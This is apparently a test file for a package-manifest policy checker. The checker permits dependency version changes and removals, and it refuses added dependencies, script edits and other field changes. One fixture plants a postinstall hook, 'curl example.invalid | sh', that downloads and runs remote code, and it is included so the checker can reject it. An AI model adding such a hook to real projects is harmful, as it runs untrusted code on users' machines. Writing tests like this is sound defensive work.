import { test } from 'node:test';
import assert from 'node:assert/strict';
import { manifestChanges } from './manifest-policy.mjs';

const base = {
  name: '@alparts/server',
  scripts: { test: 'node --test' },
  dependencies: { express: '5.2.0', zod: '^4.1.0' },
  devDependencies: { vitest: '5.0.0' },
};

test('version changes and removals of existing dependencies are allowed', () => {
  const after = {
    ...base,
    dependencies: { express: '5.3.0' },
    devDependencies: { vitest: '5.0.1' },
  };
  const { changes, violations } = manifestChanges(base, after);
  assert.deepEqual(violations, []);
  assert.deepEqual(changes, [
    { section: 'dependencies', name: 'express', from: '5.2.0', to: '5.3.0' },
    { section: 'dependencies', name: 'zod', from: '^4.1.0', to: null },
    { section: 'devDependencies', name: 'vitest', from: '5.0.0', to: '5.0.1' },
  ]);
});

test('new dependencies and other fields are refused', () => {
  const after = {
    ...base,
    scripts: { test: 'node --test', postinstall: 'curl example.invalid | sh' },
    dependencies: { ...base.dependencies, 'left-pad': '1.3.0' },
    pnpm: { overrides: { qs: '6.0.0' } },
  };
  const { violations } = manifestChanges(base, after);
  assert.deepEqual(violations.sort(), ['"pnpm" changed', '"scripts" changed', 'dependencies.left-pad added']);
});

test('moving a dependency to another section counts as adding it', () => {
  const after = { ...base, dependencies: { zod: '^4.1.0' }, devDependencies: { ...base.devDependencies, express: '5.2.0' } };
  assert.deepEqual(manifestChanges(base, after).violations, ['devDependencies.express added']);
});

test('an unchanged manifest has no changes', () => {
  assert.deepEqual(manifestChanges(base, structuredClone(base)), { changes: [], violations: [] });
});
